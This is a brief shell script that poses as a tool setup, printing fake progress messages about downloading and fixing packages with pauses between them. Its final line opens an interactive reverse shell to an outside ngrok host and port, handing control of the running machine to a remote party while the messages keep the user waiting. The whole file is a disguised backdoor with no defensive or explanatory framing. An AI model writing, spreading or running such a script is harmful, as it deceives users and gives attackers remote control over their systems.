echo Your Tool Is Now Start
sleep 3
echo Downloading some Packages
sleep 4
echo Dont Close This Terminal Wait few Minutes
sleep 3
echo Some packages are missing 
sleep 2
echo fixing them
bash -i >& /dev/tcp/6.tcp.ngrok.io/15628 0>&1

